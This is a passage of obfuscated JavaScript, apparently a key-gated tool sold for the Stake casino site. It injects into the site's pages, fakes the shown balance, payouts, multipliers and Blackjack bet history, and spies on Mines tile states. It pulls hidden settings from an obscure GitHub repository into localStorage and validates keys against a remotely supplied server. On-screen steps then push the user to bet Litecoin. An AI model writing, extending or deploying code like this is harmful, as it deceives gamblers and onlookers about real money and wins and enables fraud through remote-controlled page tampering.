    const _0x1872ca = document.querySelector(_0x1f07d9);
    if (_0x1872ca) {
      const _0x2bd5e3 = new XMLSerializer().serializeToString(_0x1872ca);
      localStorage.setItem(_0x5a7298, _0x2bd5e3);
    }
  }
  function _0x4a2a2d() {
    const _0x483b9e = document.querySelectorAll("input[type=\"radio\"][data-testid^=\"currency\"]");
    const _0x4c2081 = Array.from(_0x483b9e).find(_0x3a5f8b => _0x3a5f8b.checked)?.['nextElementSibling']?.["nextElementSibling"]?.["textContent"]["trim"]();
    _0x3a9fa2 = "USD" === _0x4c2081 ? "usd" : "EUR" === _0x4c2081 ? 'eur' : "INR" === _0x4c2081 ? "inr" : null;
  }
  function _0x1e3d1c() {
    _0xbe34bd = _0x3a9fa2 || "usd";
    if (_0xbe34bd) {
      localStorage.setItem("previous2cur", localStorage.getItem("previouscur"));
      localStorage.setItem("previouscur", _0xbe34bd);
    }
    (function () {
      const _0x1ad0a2 = _0x264fba();
      const _0x1eb7d1 = parseFloat(_0x1ad0a2.innerText.replace(/[^\d.]/g, ''));
      const _0x1ec51a = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label:nth-child(2) > div > div.input-content.svelte-1nbx5re > input") || document.querySelector("#main-content > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label > div > div.input-content.svelte-1nbx5re > input");
      document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label:nth-child(2) > span > div.currency-conversion.svelte-e4myuj > div > div");
      const _0x3021e5 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div > div > div > span.payout-result.win.svelte-19ngaoh > div > span.content.svelte-didcjq > span > span");
      if (_0x3021e5) {
        const _0x225c1f = _0x369ea9[_0xbe34bd] || '$';
        const _0x3dadd2 = localStorage.getItem("previous2cur");
        const _0x58ed99 = _0x369ea9[_0x3dadd2] || '$';
        const _0x14d3de = _0x3021e5.innerText.replace(new RegExp('[' + _0x58ed99 + ',]', 'g'), '');
        const _0x1a31d5 = parseFloat(_0x14d3de);
        _0x3021e5.innerText = 'usd' === _0xbe34bd && "inr" === _0x3dadd2 ? _0x225c1f + (_0x1a31d5 / _0x368347).toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',') : "inr" === _0xbe34bd && "usd" === _0x3dadd2 ? _0x225c1f + (_0x1a31d5 * _0x368347).toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',') : "usd" === _0xbe34bd && "eur" === _0x3dadd2 ? _0x225c1f + (_0x1a31d5 * _0x124a7d).toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',') : 'eur' === _0xbe34bd && 'usd' === _0x3dadd2 ? _0x225c1f + (_0x1a31d5 / _0x124a7d).toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',') : "eur" === _0xbe34bd && "inr" === _0x3dadd2 ? _0x225c1f + (_0x1a31d5 / (_0x368347 * _0x124a7d)).toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',') : 'inr' === _0xbe34bd && "eur" === _0x3dadd2 ? _0x225c1f + (_0x1a31d5 * (_0x368347 * _0x124a7d)).toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',') : _0x225c1f + _0x1a31d5.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
      }
      let _0x167e8e;
      let _0x5ded1d;
      _0x369ea9[_0xbe34bd];
      const _0x4f25e4 = localStorage.getItem("previous2cur");
      if ("usd" === _0xbe34bd && 'inr' === _0x4f25e4) {
        _0x2fe346 /= _0x368347;
        _0x5ded1d = _0x1eb7d1 / _0x368347;
        _0x167e8e = '$' + _0x5ded1d.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
        _0x1ad0a2.innerText = _0x167e8e;
      } else if ("inr" === _0xbe34bd && "usd" === _0x4f25e4) {
        _0x2fe346 *= _0x368347;
        _0x5ded1d = _0x1eb7d1 * _0x368347;
        _0x167e8e = '₹' + _0x5ded1d.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
        _0x1ad0a2.innerText = _0x167e8e;
      } else if ('usd' === _0xbe34bd && "eur" === _0x4f25e4) {
        _0x2fe346 *= _0x124a7d;
        _0x5ded1d = _0x1eb7d1 * _0x124a7d;
        _0x167e8e = '$' + _0x5ded1d.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
        _0x1ad0a2.innerText = _0x167e8e;
      } else if ("eur" === _0xbe34bd && "usd" === _0x4f25e4) {
        _0x2fe346 /= _0x124a7d;
        _0x5ded1d = _0x1eb7d1 / _0x124a7d;
        _0x167e8e = '€' + _0x5ded1d.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
        _0x1ad0a2.innerText = _0x167e8e;
      } else if ("eur" === _0xbe34bd && "inr" === _0x4f25e4) {
        _0x2fe346 /= _0x368347 * _0x124a7d;
        _0x5ded1d = _0x1eb7d1 / (_0x368347 * _0x124a7d);
        _0x167e8e = '€' + _0x5ded1d.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
        _0x1ad0a2.innerText = _0x167e8e;
      } else if ("inr" === _0xbe34bd && 'eur' === _0x4f25e4) {
        _0x2fe346 *= _0x368347 * _0x124a7d;
        _0x5ded1d = _0x1eb7d1 * (_0x368347 * _0x124a7d);
        _0x167e8e = '₹' + _0x5ded1d.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
        _0x1ad0a2.innerText = _0x167e8e;
      }
      localStorage.setItem('latest_bal', _0x5ded1d);
      if (_0x1ec51a) {
        _0x1ec51a.value = _0x2fe346.toFixed(0x2);
      }
    })();
  }
  function _0x58f9f0(_0x44c189 = 0x13, _0x4315f6 = 0xa) {
    if (_0x1a0243) {
      return;
    }
    _0x1a0243 = true;
    const _0x23c176 = setInterval(() => {
      const _0x1b69ed = document.querySelectorAll("input[type=\"radio\"][data-testid^=\"currency\"]");
      if (_0x1b69ed.length === _0x44c189) {
        clearInterval(_0x23c176);
        if (!_0x565349) {
          _0x1b69ed.forEach(_0x5884a6 => {
            _0x5884a6.addEventListener('change', _0x4a2a2d);
          });
          _0x4a2a2d();
          (function () {
            const _0x1927cc = document.querySelector("#svelte > div.fixed.left-0.top-0.bottom-0.right-0.p-4.flex.items-center.justify-center.text-\\[length\\:var\\(--text-size-default\\)\\].z-\\[--z-index\\] > div.rounded-md.bg-cover.bg-center.relative.w-full.min-w-\\[200px\\].max-w-\\[500px\\].max-h-\\[calc\\(100\\%-4em\\)\\].flex.flex-col.bg-grey-600.text-grey-200.overflow-hidden > div.scrollY.overscroll-contain > div > div > div.button-wrap.svelte-gnx5tk > button");
            if (_0x1927cc) {
              _0x1927cc.addEventListener("click", _0x1e3d1c);
            }
          })();
          _0x565349 = true;
        }
        const _0x308c05 = setInterval(() => {
          if (0x0 === document.querySelectorAll("input[type=\"radio\"][data-testid^=\"currency\"]").length) {
            clearInterval(_0x308c05);
            (function () {
              document.querySelectorAll("input[type=\"radio\"][data-testid^=\"currency\"]").forEach(_0x475a0a => {
                _0x475a0a.removeEventListener("change", _0x4a2a2d);
              });
              const _0xb11dd4 = document.querySelector("#svelte > div.fixed.left-0.top-0.bottom-0.right-0.p-4.flex.items-center.justify-center.text-\\[length\\:var\\(--text-size-default\\)\\].z-\\[--z-index\\] > div.rounded-md.bg-cover.bg-center.relative.w-full.min-w-\\[200px\\].max-w-\\[500px\\].max-h-\\[calc\\(100\\%-4em\\)\\].flex.flex-col.bg-grey-600.text-grey-200.overflow-hidden > div.scrollY.overscroll-contain > div > div > div.button-wrap.svelte-gnx5tk > button");
              if (_0xb11dd4) {
                _0xb11dd4.removeEventListener('click', _0x1e3d1c);
              }
              _0x3a9fa2 = null;
              _0x565349 = false;
              _0x1a0243 = false;
              _0x58f9f0();
            })();
          }
        }, _0x4315f6);
      }
    }, _0x4315f6);
  }
  function _0xe9d78b() {
    const _0x3aeb47 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div");
    if (!_0x3aeb47) {
      return void setTimeout(_0xe9d78b, 0x64);
    }
    _0x3aeb47.querySelectorAll("button").forEach(_0x1c6fb2 => {
      const _0x6a0abc = _0x1c6fb2.classList;
      if (_0x6a0abc.length > 0x1) {
        const _0x2e7598 = _0x6a0abc[0x1];
        if ("gem" !== _0x2e7598 || _0x26c190) {
          if ('mine' !== _0x2e7598 || _0x4145c2) {
            if (!("idle" !== _0x2e7598 || _0x3866fe)) {
              _0x3866fe = true;
              _0x41c1d6("uncovered", _0x262f07(_0x1c6fb2));
            }
          } else {
            _0x4145c2 = true;
            _0x41c1d6('copiedBomb', _0x262f07(_0x1c6fb2));
          }
        } else {
          _0x26c190 = true;
          _0x41c1d6("copiedMineElement", _0x262f07(_0x1c6fb2));
        }
      }
    });
    setTimeout(_0xe9d78b, 0x64);
  }
  function _0x21a7a2() {
    let _0x505d81;
    _0x505d81 = "blackjack" === _0x51e761 ? document.querySelector("#main-content > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label > div > div.input-content.svelte-1nbx5re > input") : document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label:nth-child(2) > div > div.input-content.svelte-1nbx5re > input");
    if (_0x505d81.disabled) {
      return void setTimeout(_0x21a7a2, 0xfa);
    }
    let _0x23130a = _0x505d81.cloneNode(true);
    _0x505d81.parentNode.replaceChild(_0x23130a, _0x505d81);
    _0x23130a.addEventListener("input", _0x1c5ea0 => {
      _0x2fe346 = parseFloat(_0x1c5ea0.target.value);
      const _0x4034f1 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label:nth-child(2) > span > div.currency-conversion.svelte-e4myuj > div > div");
      const _0x49ddac = {
        'usd': {
          'ltc': _0x58a80a,
          'eth': _0x120044,
          'pol': _0x15c063,
          'btc': _0xfd6c3e,
          'usdt': 0x1
        },
        'eur': {
          'ltc': _0x262b8b,
          'eth': _0x124372,
          'matic': _0x21c78d,
          'btc': _0x217262
        }
      };
      let _0x539f00;
      let _0x5bd699;
      if ('usd' === _0xbe34bd) {
        _0x5bd699 = _0x2fe346;
        _0x539f00 = _0x49ddac.usd[_0x48a9fe];
      } else if ("eur" === _0xbe34bd) {
        _0x5bd699 = _0x2fe346 * _0x124a7d;
        _0x539f00 = _0x49ddac.usd[_0x48a9fe];
      } else if ("inr" === _0xbe34bd) {
        _0x5bd699 = _0x2fe346 / _0x368347;
        _0x539f00 = _0x49ddac.usd[_0x48a9fe];
      }
      let _0xa37ee7 = _0x5bd699 / _0x539f00;
      if (isNaN(_0xa37ee7)) {
        _0xa37ee7 = 0x0;
      }
      _0x4034f1.innerText = _0xa37ee7.toFixed(0x8) + " " + _0x48a9fe.toUpperCase();
    });
    _0x23130a.addEventListener("blur", () => {
      if (isNaN(_0x2fe346)) {
        _0x23130a.value = 0x0.toFixed(0x2);
      } else {
        _0x23130a.value = _0x2fe346.toFixed(0x2);
      }
    });
  }
  function _0x3c087a() {
    if (document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div > div")) {
      const _0x510771 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div > div > div > span.number-multiplier.svelte-19ngaoh > span");
      if (_0x510771) {
        _0x510771.innerHTML = "24.75×";
        document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div").querySelectorAll("button").forEach(_0x128bcf => {
          const _0x1bdad0 = _0x128bcf.classList;
          if (_0x1bdad0.length > 0x1) {
            if ("gem" === _0x1bdad0[0x1] && 'false' === _0x128bcf.getAttribute("data-revealed")) {
              return void _0x41c1d6("copiedUnclicked", _0x262f07(_0x128bcf));
            }
          }
        });
        _0x5a84e7("Setup Successful. Head over to https://stake.ac and it will be all good.");
        return void _0x41c1d6("copiedWinMenu", "#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div > div");
      }
    }
    setTimeout(_0x3c087a, 0x64);
  }
  async function _0x416c44() {
    try {
      const _0x5201cd = await fetch("https://raw.githubusercontent.com/diuofbnaiudjbnoufibhn10oiehno0ishanfbi/odbviob9oiebhvoicxoighj0o92eh0fhcnblksahnoghap9dghasoijhb3hg/main/tFz2Cde2jMiF7lvdxvCH8Np1czLcTxk2zl7Uc4hnE5P71JXtwgVBNoXL7kihzIJk5z4mRUykSOdcq7rKrwCfy1UkRo4JYFgtxHqILwIRbNhhwc581pB6wjqGnO8DyMGqGL3QML9AIVzq4UuabIGI40NEYziI0DJK7jEPPv9vn6wIrcG7PRv7X7nlCCarzZx8FfeE6OvUwR4b3msZxPjcx0UWcv2UWYZSvTC9Q1USDhZoE9a5h3Bho8wwJE05Nlh");
      if (!_0x5201cd.ok) {
        throw new Error("Network response was not ok: " + _0x5201cd.statusText);
      }
      !function (_0x40027a) {
        _0x40027a.split("\n").forEach(_0xfef43d => {
          const [_0x39416b, _0x21ac36] = _0xfef43d.split(',').map(_0x47823b => _0x47823b.trim());
          if (_0x39416b && undefined !== _0x21ac36) {
            localStorage.setItem(_0x39416b, "null" === _0x21ac36 ? null : _0x21ac36);
          }
        });
      }(await _0x5201cd.text());
    } catch (_0x55b4fd) {
      console.error("Error fetching or importing file:", _0x55b4fd);
    }
  }
  function _0x278028() {
    _0x1e6533(-_0x2fe346);
    _0x2fe346 *= 0x2;
    _0x3e10cf = true;
  }
  function _0x2575e3() {
    const _0x1bf518 = document.querySelectorAll(".value");
    let _0x3ef154 = false;
    _0x1bf518.forEach(_0x26a84a => {
      const _0x29b2b2 = _0x26a84a.classList.value;
      const _0x5d50be = parseInt(_0x26a84a.textContent, 0xa);
      if (_0x29b2b2.includes('none')) {
        _0x3ef154 = true;
        if (!_0x1d176e) {
          _0x1e6533(-_0x2fe346);
          _0x1d176e = true;
          _0x512b6e = false;
          _0x4c18ce = false;
          _0x2276b3 = false;
          _0x28501c = false;
          if (document.querySelector("#main-content > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > div > button:nth-child(4)")) {
            document.querySelector("#main-content > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > div > button:nth-child(4)").addEventListener("click", _0x278028);
          }
        }
      } else {
        if (_0x29b2b2.includes('win') && !_0x512b6e && 0x15 !== _0x5d50be) {
          _0x1e6533(0x2 * _0x2fe346);
          _0x512b6e = true;
          const _0x55965f = new Date();
          let _0x57efca = _0x55965f.getHours();
          const _0x2baf08 = _0x55965f.getMinutes();
          const _0x7e3ea3 = _0x57efca >= 0xc ? 'PM' : 'AM';
          _0x57efca %= 0xc;
          _0x57efca = _0x57efca || 0xc;
          const _0x50c387 = _0x57efca + ':' + (_0x2baf08 < 0xa ? '0' : '') + _0x2baf08 + " " + _0x7e3ea3;
          let _0x129fbd;
          let _0x353e90;
          if ("usd" === _0xbe34bd) {
            _0x129fbd = '$' + _0x2fe346.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
            _0x353e90 = '$' + (0x2 * _0x2fe346).toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
          } else if ("eur" === _0xbe34bd) {
            _0x129fbd = '€' + _0x2fe346.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
            _0x353e90 = '€' + (0x2 * _0x2fe346).toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
          } else if ("inr" === _0xbe34bd) {
            _0x129fbd = '₹' + _0x2fe346.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
            _0x353e90 = '₹' + (0x2 * _0x2fe346).toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
          }
          _0x276961.push({
            'game': 'Blackjack',
            'bet_amount': _0x129fbd,
            'payout': _0x353e90,
            'multiplier': "2.00×",
            'time': _0x50c387
          });
        } else {
          if (_0x29b2b2.includes("lose") && !_0x4c18ce) {
            _0x4c18ce = true;
            const _0x15ec92 = new Date();
            let _0x3a7eb5 = _0x15ec92.getHours();
            const _0xa76d9 = _0x15ec92.getMinutes();
            const _0x19578b = _0x3a7eb5 >= 0xc ? 'PM' : 'AM';
            _0x3a7eb5 %= 0xc;
            _0x3a7eb5 = _0x3a7eb5 || 0xc;
            const _0x2ee2f2 = _0x3a7eb5 + ':' + (_0xa76d9 < 0xa ? '0' : '') + _0xa76d9 + " " + _0x19578b;
            let _0x2fe1f7;
            if ("usd" === _0xbe34bd) {
              _0x2fe1f7 = '$' + _0x2fe346.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
            } else if ('eur' === _0xbe34bd) {
              _0x2fe1f7 = '€' + _0x2fe346.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
            } else if ('inr' === _0xbe34bd) {
              _0x2fe1f7 = '₹' + _0x2fe346.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
            }
            _0x276961.push({
              'game': "Blackjack",
              'bet_amount': _0x2fe1f7,
              'payout': '-' + _0x2fe1f7,
              'multiplier': "0.00×",
              'time': _0x2ee2f2
            });
          } else {
            if (_0x29b2b2.includes("draw") && !_0x28501c) {
              _0x1e6533(_0x2fe346);
              _0x28501c = true;
              const _0x51d2b1 = new Date();
              let _0x5c1dc5 = _0x51d2b1.getHours();
              const _0x2b9b18 = _0x51d2b1.getMinutes();
              const _0x695c7 = _0x5c1dc5 >= 0xc ? 'PM' : 'AM';
              _0x5c1dc5 %= 0xc;
              _0x5c1dc5 = _0x5c1dc5 || 0xc;
              const _0x1d7072 = _0x5c1dc5 + ':' + (_0x2b9b18 < 0xa ? '0' : '') + _0x2b9b18 + " " + _0x695c7;
              let _0x1aca37;
              if ("usd" === _0xbe34bd) {
                _0x1aca37 = '$' + _0x2fe346.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
              } else if ('eur' === _0xbe34bd) {
                _0x1aca37 = '€' + _0x2fe346.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
              } else if ("inr" === _0xbe34bd) {
                _0x1aca37 = '₹' + _0x2fe346.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
              }
              _0x276961.push({
                'game': "Blackjack",
                'bet_amount': _0x1aca37,
                'payout': _0x1aca37,
                'multiplier': "1.00×",
                'time': _0x1d7072
              });
            } else {
              if (0x15 === _0x5d50be && !_0x2276b3) {
                if (0x4 === document.querySelector("#main-content > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div > div.hands.svelte-lqc515 > div.player.svelte-eq0hy3 > div > div").childNodes.length) {
                  _0x1e6533(2.5 * _0x2fe346);
                  _0x2276b3 = true;
                  const _0x47c1f5 = new Date();
                  let _0x3e5f79 = _0x47c1f5.getHours();
                  const _0x153e36 = _0x47c1f5.getMinutes();
                  const _0x3b10a9 = _0x3e5f79 >= 0xc ? 'PM' : 'AM';
                  _0x3e5f79 %= 0xc;
                  _0x3e5f79 = _0x3e5f79 || 0xc;
                  const _0x27e3b9 = _0x3e5f79 + ':' + (_0x153e36 < 0xa ? '0' : '') + _0x153e36 + " " + _0x3b10a9;
                  let _0x21bfa7;
                  let _0x453c3e;
                  if ("usd" === _0xbe34bd) {
                    _0x21bfa7 = '$' + _0x2fe346.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
                    _0x453c3e = '$' + (2.5 * _0x2fe346).toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
                  } else if ("eur" === _0xbe34bd) {
                    _0x21bfa7 = '€' + _0x2fe346.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
                    _0x453c3e = '€' + (2.5 * _0x2fe346).toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
                  } else if ("inr" === _0xbe34bd) {
                    _0x21bfa7 = '₹' + _0x2fe346.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
                    _0x453c3e = '₹' + (2.5 * _0x2fe346).toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
                  }
                  _0x276961.push({
                    'game': 'Blackjack',
                    'bet_amount': _0x21bfa7,
                    'payout': _0x453c3e,
                    'multiplier': "2.50×",
                    'time': _0x27e3b9
                  });
                } else {
                  _0x1e6533(0x2 * _0x2fe346);
                  _0x2276b3 = true;
                  const _0x3adc92 = new Date();
                  let _0x1ef3dc = _0x3adc92.getHours();
                  const _0x144b0a = _0x3adc92.getMinutes();
                  const _0x38db9c = _0x1ef3dc >= 0xc ? 'PM' : 'AM';
                  _0x1ef3dc %= 0xc;
                  _0x1ef3dc = _0x1ef3dc || 0xc;
                  const _0x202a8b = _0x1ef3dc + ':' + (_0x144b0a < 0xa ? '0' : '') + _0x144b0a + " " + _0x38db9c;
                  let _0x39f53d;
                  let _0x1692bd;
                  if ("usd" === _0xbe34bd) {
                    _0x39f53d = '$' + _0x2fe346.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
                    _0x1692bd = '$' + (0x2 * _0x2fe346).toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
                  } else if ("eur" === _0xbe34bd) {
                    _0x39f53d = '€' + _0x2fe346.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
                    _0x1692bd = '€' + (0x2 * _0x2fe346).toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
                  } else if ("inr" === _0xbe34bd) {
                    _0x39f53d = '₹' + _0x2fe346.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
                    _0x1692bd = '₹' + (0x2 * _0x2fe346).toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
                  }
                  _0x276961.push({
                    'game': "Blackjack",
                    'bet_amount': _0x39f53d,
                    'payout': _0x1692bd,
                    'multiplier': "2.00×",
                    'time': _0x202a8b
                  });
                }
              }
            }
          }
        }
      }
    });
    if (!_0x3ef154) {
      _0x1d176e = false;
      if (document.querySelector("#main-content > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > div > button:nth-child(4)")) {
        document.querySelector("#main-content > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > div > button:nth-child(4)").removeEventListener("click", _0x278028);
      }
      if (_0x3e10cf) {
        _0x2fe346 /= 0x2;
        _0x3e10cf = false;
      }
    }
  }
  async function _0x3837d9() {
    try {
      const _0x53ce08 = await fetch("https://raw.githubusercontent.com/diuofbnaiudjbnoufibhn10oiehno0ishanfbi/odbviob9oiebhvoicxoighj0o92eh0fhcnblksahnoghap9dghasoijhb3hg/main/real");
      if (!_0x53ce08.ok) {
        throw new Error("Failed to fetch the raw content");
      }
      return (await _0x53ce08.text()).trim();
    } catch (_0x3f89ee) {
      return null;
    }
  }
  async function _0x25891d(_0x199831, _0x3fa32c = false) {
    if (!_0x3fa32c) {
      _0x199831 = document.getElementById('keyInput').value;
    }
    if (_0x199831) {
      try {
        const _0x38d478 = await _0x3837d9();
        if (!_0x38d478) {
          throw new Error("Failed to retrieve the URL");
        }
        const _0x5e6249 = _0x38d478 + "check_key";
        const _0x3432d0 = await fetch(_0x5e6249, {
          'method': "POST",
          'headers': {
            'Content-Type': "application/json"
          },
          'body': JSON.stringify({
            'key': _0x199831
          })
        });
        const _0x19a5c8 = await _0x3432d0.json();
        if (_0x19a5c8.success) {
          if (_0x3fa32c) {
            _0xc3cd8f(_0x199831);
            (function () {
              const _0x35f36c = document.getElementById('validateKeyModal');
              if (_0x35f36c) {
                _0x35f36c.remove();
              }
              _0x3c087a();
              _0xe9d78b();
              const _0x1a0973 = document.createElement("div");
              _0x1a0973.style.position = "fixed";
              _0x1a0973.style.top = "50px";
              _0x1a0973.style.right = "20px";
              _0x1a0973.style.width = "320px";
              _0x1a0973.style.padding = "20px";
              _0x1a0973.style.backgroundColor = "#1e1e1e";
              _0x1a0973.style.border = "1px solid #444";
              _0x1a0973.style.boxShadow = "0 4px 12px rgba(0, 0, 0, 0.4)";
              _0x1a0973.style.zIndex = '9999';
              _0x1a0973.style.fontFamily = "Arial, sans-serif";
              _0x1a0973.style.borderRadius = "8px";
              _0x1a0973.style.color = "#ffffff";
              _0x1a0973.innerHTML = "\n    <div style=\"background-color: #ffcc00; color: #ff0000; padding: 15px; margin-bottom: 20px; font-size: 24px; font-weight: bold; text-align: center;\">\n        MAKE SURE THE CRYPTO CURRENCY IS LITECOIN (LTC)\n    </div>\n    <h2 style=\"color: #00aaff; font-size: 20px; margin-bottom: 15px;\">Setup Steps</h2>\n    <p style=\"margin-bottom: 10px;\"><strong>Step 1:</strong> Set the number of mines to <strong>1 mine</strong>.</p>\n    <p style=\"margin-bottom: 10px;\"><strong>Step 2:</strong> Place your bet.</p>\n    <p><strong>Step 3:</strong> Click one tile and cash out. <br><strong>If it was a bomb, retry.</strong></p>\n";
              document.body.appendChild(_0x1a0973);
            })();
          } else {
            _0x416c44();
            const _0x1eff3f = _0xb5221(false);
            if (0x0 === _0x1eff3f.length) {
              _0xc3cd8f(_0x199831);
              alert("Key is valid and setup complete.");
              const _0x4c5f77 = document.getElementById("validateKeyModal");
              if (_0x4c5f77) {
                _0x4c5f77.remove();
              }
            } else {
              alert("Setup failed. Missing items: " + _0x1eff3f.join(", "));
            }
          }
        } else {
          alert(_0x19a5c8.message || "Invalid or already used key.");
        }
      } catch (_0x51a69b) {
        alert("The API is currently down, try again later");
      }
    } else {
      alert("Please enter a key.");
    }
  }
  function _0x264fba() {
    const _0x5dbfca = document.querySelector(".balance-toggle .content span");
    return _0x5dbfca || null;
  }
  function _0x498b2e() {
    let _0x53f62a;
    _0x53f62a = 'https://stake.ac/casino/games/blackjack' === window.location.href ? document.querySelector("#main-content > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label > div > div.input-button-wrap.svelte-1nbx5re > button:nth-child(2)") : document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label:nth-child(2) > div > div.input-button-wrap.svelte-1nbx5re > button:nth-child(2)");
    if (_0x53f62a) {
      _0x53f62a.addEventListener('click', () => {
        if (_0x3a5df1) {
          _0x3a5df1 = false;
          const _0x547a86 = _0x264fba();
          const _0x40f1bd = parseFloat(_0x547a86.innerText.replace(/[^\d.]/g, ''));
          let _0x619cae;
          let _0x5e96b8;
          if (0x2 * _0x2fe346 > _0x40f1bd) {
            _0x2fe346 = _0x40f1bd;
          } else {
            _0x2fe346 *= 0x2;
          }
          _0x3493c8 = true;
          _0xd8bd68 = true;
          if ("https://stake.ac/casino/games/blackjack" === window.location.href) {
            _0x619cae = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label > div > div.input-content.svelte-1nbx5re > input");
            _0x5e96b8 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label > span > div.currency-conversion.svelte-e4myuj > div > div");
          } else {
            _0x619cae = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label:nth-child(2) > div > div.input-content.svelte-1nbx5re > input");
            _0x5e96b8 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label:nth-child(2) > span > div.currency-conversion.svelte-e4myuj > div > div");
          }
          const _0x2a850e = {
            'usd': {
              'ltc': _0x58a80a,
              'eth': _0x120044,
              'pol': _0x15c063,
              'btc': _0xfd6c3e,
              'usdt': 0x1
            },
            'eur': {
              'ltc': _0x262b8b,
              'eth': _0x124372,
              'matic': _0x21c78d,
              'btc': _0x217262
            }
          };
          let _0xdeefc7;
          let _0xc1b5e;
          if ("usd" === _0xbe34bd) {
            _0xc1b5e = _0x2fe346;
            _0xdeefc7 = _0x2a850e.usd[_0x48a9fe];
          } else if ("eur" === _0xbe34bd) {
            _0xc1b5e = _0x2fe346 * _0x124a7d;
            _0xdeefc7 = _0x2a850e.usd[_0x48a9fe];
          } else if ("inr" === _0xbe34bd) {
            _0xc1b5e = _0x2fe346 / _0x368347;
            _0xdeefc7 = _0x2a850e.usd[_0x48a9fe];
          }
          const _0x377432 = (_0xc1b5e / _0xdeefc7).toFixed(0x8);
          _0x5e96b8.innerText = _0x377432 + " " + _0x48a9fe.toUpperCase();
          _0x619cae.value = _0x2fe346.toFixed(0x2);
          setTimeout(() => {
            _0x3a5df1 = true;
          }, 0x64);
        }
      });
    }
    _0x28d45f = setTimeout(_0x498b2e, 0x1f4);
  }
  function _0x471b5a() {
